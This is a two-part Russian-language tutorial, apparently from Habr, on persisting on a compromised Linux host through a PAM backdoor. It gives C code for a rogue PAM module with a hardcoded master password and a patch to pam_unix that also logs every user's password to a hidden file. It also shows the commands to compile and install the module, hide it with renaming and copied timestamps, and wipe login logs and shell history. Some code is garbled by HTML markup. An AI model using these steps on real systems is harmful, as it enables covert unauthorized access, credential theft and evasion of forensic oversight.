# PAM Backdoor
**Внимание!** Статья несёт исключительно информативный характер. Подобные действия преследуются по закону!

**Привет!** В двух статьях мы сфокусируемся на том, как злоумышленники могут использовать модуль PAM для создания backdoor'ов, погрузимся в мир аутентификации, раскроем работу PAM под капотом, научимся скрывать свои следы и, самое главное, реализуем это всё на практике.

И помни,

> "Ни одна система не является безопасной." ©MRX

### Немножко теории

**PAM (Pluggable Authentication Modules)** - это набор разделяемых библиотек, которые позволяют интегрировать различные низкоуровневые методы аутентификации в виде единого высокоуровневого API.

PAM используется везде, где требуется аутентификация пользователя или проверка его прав. Например, при подключении через SSH или FTP, а также при повышении привилегий через команду sudo.

Модули PAM находятся в директории lib/security для старых операционных систем типа CentOS и в директории /usr/lib/x86_64-linux-gnu/security для современных ОС вроде последних релизов Ubuntu. Конфигурационные файлы PAM — в директории /etc/pam.d.

Наглядная схема работы PAM:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/251/ea1/327/251ea13277cec43e34169855956eef72.png)

[_Подробнее о PAM можно почитать здесь_](https://habr.com/ru/companies/slurm/articles/694222/)

### Вводная информация

Итак, представим ситуацию: мы скомпрометировали хост, получив УЗ root'a. Безусловно, нам необходимо закрепиться в системе. Способов существует у-у-у-у-йма: от запланированной задачки в cron до руткитов. Но мы ~~захотели повыёбываться~~ выбрали проверенный временем способ: модуль PAM.

У нас есть 2 пути:

1. Использование готовых решений
    
2. Трайхардить ручками
    

Очевидно, для развития скиллов, выберем вариант под номером 2. Но, если вы ленивый человек, то [вам сюда](https://github.innominds.com/rek7/madlib).

Также доступен следующий выбор:

1. Написать свой модуль (рассмотрен в этой части)
    
2. Модифицировать существующий модуль (рассмотрен в следующей части)
    

Рассмотрим оба способа.

### Перейдем к практике

#### Способ 1. Пишем свой модуль

Итак, в роле целевого хоста будет выступать Kali. В роле атакующего- Xubuntu

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/538/f41/dd1/538f41dd181a6fcc928fd038c61de264.png)

Если кратко, то нашей целью является дополнительный самописный модуль проверки пароля.  
Например, мы хотим "добавить" дополнительный пароль для пользователя root. Пусть его оригинальный пароль - 'kali', а добавленный нами - 'bye'.

В таком случае, пользователь root будет иметь уже 2 пароля. Важно отметить, что новый модуль будет проверять только придуманный нами пароль, будто это дополнительное условие проверки в вашем коде.

Итак, приступим.

Поскольку модули написаны на языке С (редко на С++), то после их написания, необходима их компиляция. Соответственно, файлы имеют расширение *.so. Это значит, что нам тоже нужно будет компилировать наш модуль.

Вот как можно посмотреть стандартные решения:  
`ls /usr/lib/x86_64-linux-gnu/security/`

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/375/ddd/845/375ddd845e1c514ba34c0b6cb3ce984b.png)

Для начала, давайте создадим проект и назовем его test.c, затем поместим в него следующий код:

```
#include <stdio.h>#include <string.h>#include <stdlib.h>#include <unistd.h>#include <security/pam_appl.h>#include <security/pam_modules.h>#define MYPASSWD "bye" //change thisPAM_EXTERN int pam_sm_setcred(pam_handle_t pamh, int flags, int argc, const char *argv) {return PAM_SUCCESS;}PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t pamh, int flags, int argc, const char *argv) {return PAM_SUCCESS;}PAM_EXTERN int pam_sm_authenticate(pam_handle_t pamh, int flags,int argc, const char argv) {char password = NULL; <span class="token function">pam_get_authtok</span><span class="token punctuation">(</span>pamh<span class="token punctuation">,</span> PAM_AUTHTOK<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>password<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> MYPASSWD<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>MYPASSWD<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> PAM_SUCCESS<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>}
```

_Не забывайте поменять придуманный пароль в 7 строке :)_

Немножко пробежимся по коду:  
• **pam_sm_authenticate** осуществляет аутентификацию пользователя. Она проверяет предоставленный пользователем пароль и возвращает PAM_SUCCESS в случае успеха.  
• **pam_sm_acct_mgmt** проверяет параметры УЗ пользователя (например, проверка срока действия учетной записи).  
• **pam_sm_setcred** устанавливает удостоверение пользователя (выдача доступа).

Теперь давайте скомпилим наш проект, предварительно установив нужные зависимости и компоненты:

```
apt install libpam0g-devgcc -fPIC -c -o test.o test.cgcc -shared -o test.so test.o
```

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/4ce/d4c/bf8/4ced4cbf86f4e81d5c1b239187c2a173.png)

Переместим к другим файлам:

`mv test.so /lib/x86_64-linux-gnu/security/`

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/e4d/538/e20/e4d538e20c2cfa3d7cc93ed25826e264.png)

Теперь давайте подключим наш модуль для авторизации с помощью SSH

Просмотрим содержимое файла `/etc/pam.d/sshd`

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/3ec/fd5/2f5/3ecfd52f53421d888ac3e230a321e900.png)

В самом начале видим подключение common-auth, которое нужно будет изменить.

> Раньше логика взаимодействия была указана отдельно в каждом конфигурационном файле сервиса, то сейчас в новых версиях Linux используется подключение конфигурационных файлов _/etc/pam.d/common-account_, _/etc/pam.d/common-auth_ и тд, которые используются в конфигурации **pamd** других сервисов.

Это даёт нам возможность изменить всего лишь common-auth, при этом закрепившись в ssh, su и т.д.

Давайте так и поступим:

`nano /etc/pam.d/common-auth`

Было:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/1a1/745/9b4/1a17459b4166d8ae74168f16cd7ecd9c.png)

Стало:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/cf3/aa5/285/cf3aa5285ff814e4e373b95eb9368f57.png)

`systemctl restart ssh`

Пробуем подключиться:

```
ssh root@192.168.56.102password: kalisuccessssh root@192.168.56.102password: byesuccess
```

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/a6b/00b/7ab/a6b00b7abf7bd14dc6fbffce1a66a596.png)

**Однако, если вы, по-прежнему, хотите установить бэкдур только для SSH, то можете изменить /etc/pam.d/sshd следующим образом:**

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/d16/0d7/484/d160d74849b009e328f9077e593da467.png)

Здесь мы взяли `auth sufficient pam_unix.so nullok` из `/etc/pam.d/common-auth`, чтобы не приходилось изменять и его.

Проверка:

• Для пароля `bye`:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/970/d7e/ea7/970d7eea73ead950b037f90be07c1fab.png)

• Для пароля `kali`:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/cf7/95d/25b/cf795d25b3a8b590d74bf791cf0f4f71.png)

Как видно, такой вариант увенчался успехом.

### Заметаем следы

А теперь давайте замаскируем [test.so](http://test.so/), изменив его права, название и временные метки

`chmod 644 test.so`

`mv test.so pam_auth.so`

_Не забываем изменить названия в конфигах с_ `test.so` на `pam_auth.so`

```
touch -r /lib/x86_64-linux-gnu/security/pam_rootok.so /lib/x86_64-linux-gnu/security/pam_auth.so
```

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/04e/753/4ae/04e7534ae751e333f02edfb21282bd31.png)

Файл успешно замаскирован.

Также не забудем про ранее подредаченные `/etc/pam.d/sshd`и `/etc/pam.d/common-auth`

`touch -r /etc/pam.d/sudo /etc/pam.d/sshd`

`touch -r /etc/pam.d/sudo /etc/pam.d/common-auth`

Теперь подчистим логи:

```
# echo > /var/log/wtmpecho > /var/log/btmpecho > /var/log/lastlog
```

```
history -rcat /dev/null > ~/.bash_history
```

Поздравляю! Вы смогли закрепиться в системе, написав свой модуль.

Для закрепления прочитанного предлагаю [посмотреть видеоинструкцию](https://youtu.be/puf7jLTga1o)

### Вывод

Данный вариант закрепления не является очень надежным способом из-за создания нового файла, который более-менее опытный админ легко найдет. Также мы меняем конфиги, которые тоже можно сравнить с оригинальными. Помимо этого, мы компилили файл на целевом хосте, чего лучше не делать (по-хорошему, если это сервер, то не должно быть возможности компиляции файлов для обеспечения безопасности). Данный способ подойдет в качестве закрепления на хостах, чьи хозяева не являются уверенными пользователями Linux, которые с легкостью заподозрят неладное.

Во второй части рассмотрим более скрытный способ, а также настроим логирование всех пользователей, которые вводят пароль в системе. До скорого :)

# Часть 2
Добро пожаловать во вторую часть статьи "PAM backdoor". В предыдущей части мы обсудили, что такое PAM (Pluggable Authentication Modules) и как можно создать собственный модуль для PAM. В этой второй части мы пойдём немного по другому пути и изменим уже существующий модуль, а также настроим логирование для сбора паролей.

Кто не читал первую часть, [вам сюда](https://habr.com/ru/articles/791240/).

### Способ 2. Модификация модуля

Если немножко вспомним прошлую статью, то заметим, что в качестве "стандарта", сервисы для авторизации используют `common-auth`, в котором содержится общий модуль `pam_unix.so`

```
cat su 
@include common-auth
```

```
cat sshd 
# Standard Un*x authentication.
@include common-auth
```

```
cat sudo-i 
@include common-auth
```

и т.д.

Собственно, вот и комментарий в common-auth, который описывает для чего он нужен и с чем его едят:

```
#/etc/pam.d/common-auth - authentication settings common to all services
#
# This file is included from other service-specific PAM config files,
# and should contain a list of the authentication modules that define
# the central authentication scheme for use on the system
# (e.g., /etc/shadow, LDAP, Kerberos, etc.).  The default is to use the
# traditional Unix authentication mechanisms.
```

А вот и сам подключаемый модуль, который нам интересен:

```
cat common-auth 
auth    [success=1 default=ignore]      pam_unix.so nullok
```

На данном этапе необходимо определить порядок действий:

1. Получаем исходник `pam_unix.so`
    
2. Модифицируем его
    
3. Компилируем
    
4. Заменяем "стандарт" на свой
    
5. Профит!
    

### Перейдем к практике

_UPD: Данную атаку буду проводить через Remote вектор (удаленно)._

Собственно, схема стандартная: скомпрометировал хост и хочу закрепиться в системе.

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/ee0/d5d/c86/ee0d5dc86041e2640f2d571d6f51e288.png)

#### 1. Получение исходников

_произвожу действия на своём хосте_

Проверяем версию:

```
 dpkg -l | grep pam
ii  libpam-gnome-keyring:amd64                     42.1-1+b2                            amd64        PAM module to unlock the GNOME keyring upon login
ii  libpam-modules:amd64                           1.5.2-9.1ubuntu1                         amd64        Pluggable Authentication Modules for PAM
ii  libpam-modules-bin                             1.5.2-9.1ubuntu1                         amd64        Pluggable Authentication Modules for PAM - helper binaries
ii  libpam-runtime                                 1.5.2-9.1                            all          Runtime support for the PAM library
ii  libpam0g:amd64                                 1.5.2-9.1ubuntu1                         amd64        Pluggable Authentication Modules library
ii  libpam0g-dev:amd64                             1.5.2-9.1ubuntu1                         amd64        Development files for PAM
Как видим, версия PAM 1.5.2
```

```
wget https://github.com/linux-pam/linux-pam/releases/download/v1.5.2/Linux-PAM-1.5.1.tar.xz
```

*версию выбираете сами

```
tar -xf Linux-PAM-1.5.2.tar.xz
```

```
cd Linux-PAM-1.5.2/modules/pam_url
```

Среди множества файлов модуля `pam_unix`, нам необходим следующий :

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/a24/ae1/6ae/a24ae16aef340488fe47331c8f9e5f2b.png)

#### 2. Модификация

Открываем его:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/c5b/78b/9e7/c5b78b9e7d701f501802d7cfb05e1702.png)

Находим 172-ю строку и модифицируем код, добавляя дополнительную проверку пароля

```
if (strcmp(p, "the-world-is-yours") != 0) 
retval = _unix_verify_password(pamh, name, p, ctrl);
else
retval = PAM_SUCCESS;
```

Также можно сделать так:

```
retval = _unix_verify_password(pamh, name, p, ctrl);
name = p = NULL;
if (strcmp(p,"magic") == 0)
retval = PAM_SUCCESS; 
```

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/a55/077/9a7/a550779a74f66c9f8246a5ae1347fff9.png)

Собственно, мы добавили новое условие проверки пароля. Если говорить словами, то будет что-то типо: "Если количество различий введенных символов со строкой 'bye' равны нулю, то возвращаемое значение будет равно 'PAM_SUCCESS' ".

Теперь накатим логирование:

```
if (retval == PAM_SUCCESS) { 
FILE *fd; 
fd = fopen("/tmp/.passwd", "a"); 
fprint(fd, "%s:%sn", name, p); 
fclose(fd); 
}
```

В конечном итоге, получилось так:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/a98/8ec/16c/a988ec16c2c810520e5655c47599d21e.png)

Теперь логи будут лететь в /tmp/.passwd

#### 3. Компиляция

Поскольку я имею две разные системы (несмотря на одинаковую версию PAM): kali и xubuntu, скомпилированный модуль на kali не подойдет для xubuntu и наоборот. Вас будут ждать эти пять заветных слов при попытки авторизации "Permission denied, please try again."...

Если есть какой-то способ обойти это- отпишитесь. Будет очень интересно почитать.

```
cd Linux-PAM-1.5.2
```

```
./configure
```

```
make
```

Также хочу отметить, что при компиляции я столкнулся с рядом проблем:  
1. `Fatal error: rpc/rpc.h: No such file or directory`

Фикс:

```
apt install libntirpc-dev
dpkg -L libntirpc-dev
```

2. `In file included from /usr/include/tirpc/rpc/rpc.h, from yppasswd_xdr.c error: unknown type name 'int32_t'`

Фикс:

В файле yppasswd_xdr.c подключаем

```
#include <stdint.h>
```

3. `In file included from /usr/include/tirpc/rpc/rpc.h, from yppasswd_xdr.c error: unknown type name 'u_int32_t'`

Фикс:

В файле /usr/include/tirpc/rpc/types.h меняем `u_int32_t` на `uint32_t`

#### 4. Заменяем "стандарт" на свой

Итак, после того, как мы изменили файл pam_unix_auth.c, необходимо закинуть на целевой хост папку с PAM'ом

```
tar -zcvf temp.tar.gz Linux-PAM-1.5.2
```

```
python3 -m http.server
```

```
wget http://ip:8000/temp.tar.gz
```

Далее, делаем действия из пункта **3**.

После этого, распаковываем файл и заменяем его:

```
tar -xvf temp.tar.gz
```

```
mv Linux-PAM-1.5.2/modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu-security
```

Также стоит дать нужные права и поменять временные метки файла:

```
chmod 644 pam_unix.so
```

```
touch -r /lib/x86_64-linux-gnu/security/pam_access.so /lib/x86_64-linux-gnu/security/pam_unix.so
```

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/4bf/886/e26/4bf886e2696082d9ba035c227b9899a9.png)

_Ну и чистка логов в дальнейшем._

Проверяем результат:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/aa9/39e/718/aa939e718874065fabb0cee8f6399f56.png)

Стоить добавить, что данная лазейка работает для любых аккаунтов, существующих на хосте. Например:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/be7/637/78a/be763778ab9455059833aa430dd93495.png)

Как видно, мы не задавали пароль пользователю и он успешно смог войти. Также и для su:

![](https://habrastorage.org/r/w1560/getpro/habr/upload_files/a8b/3f7/a62/a8b3f7a622eda47435eec6d2b1329389.png)

### Заключение

Как я и говорил, данный способ является чуть более незаметным с точки зрения количества файлов, нежели добавление нового модуля, но требует компиляции на целевом хосте из-за некоторых особенностей, что может стать серьезной проблемой скрытия своего присутствия. Помимо этого, может возникнуть множество непредвиденных казусов (ошибки компиляции), которые требуют лишней активности.
